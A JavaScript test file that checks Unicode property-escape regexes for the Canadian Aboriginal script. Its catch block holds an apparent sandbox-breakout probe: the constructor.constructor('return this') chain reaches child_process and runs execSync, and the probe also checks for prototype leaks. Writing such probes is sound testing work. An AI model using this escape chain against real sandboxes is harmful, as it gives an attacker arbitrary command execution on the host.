try {
    const matchSymbols = buildString({
        loneCodePoints: [],
        ranges: [
            [
                5120,
                5759
            ],
            [
                6320,
                6389
            ]
        ]
    });
    testPropertyEscapes(/^\p{Script_Extensions=Canadian_Aboriginal}+$/u, matchSymbols, '\\p{Script_Extensions=Canadian_Aboriginal}');
    testPropertyEscapes(/^\p{Script_Extensions=Cans}+$/u, matchSymbols, '\\p{Script_Extensions=Cans}');
    testPropertyEscapes(/^\p{scx=Canadian_Aboriginal}+$/u, matchSymbols, '\\p{scx=Canadian_Aboriginal}');
    testPropertyEscapes(/^\p{scx=Cans}+$/u, matchSymbols, '\\p{scx=Cans}');
    const nonMatchSymbols = buildString({
        loneCodePoints: [],
        ranges: [
            [
                56320,
                57343
            ],
            [
                0,
                5119
            ],
            [
                5760,
                6319
            ],
            [
                6390,
                56319
            ],
            [
                57344,
                1114111
            ]
        ]
    });
    testPropertyEscapes(/^\P{Script_Extensions=Canadian_Aboriginal}+$/u, nonMatchSymbols, '\\P{Script_Extensions=Canadian_Aboriginal}');
    testPropertyEscapes(/^\P{Script_Extensions=Cans}+$/u, nonMatchSymbols, '\\P{Script_Extensions=Cans}');
    testPropertyEscapes(/^\P{scx=Canadian_Aboriginal}+$/u, nonMatchSymbols, '\\P{scx=Canadian_Aboriginal}');
    testPropertyEscapes(/^\P{scx=Cans}+$/u, nonMatchSymbols, '\\P{scx=Cans}');
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}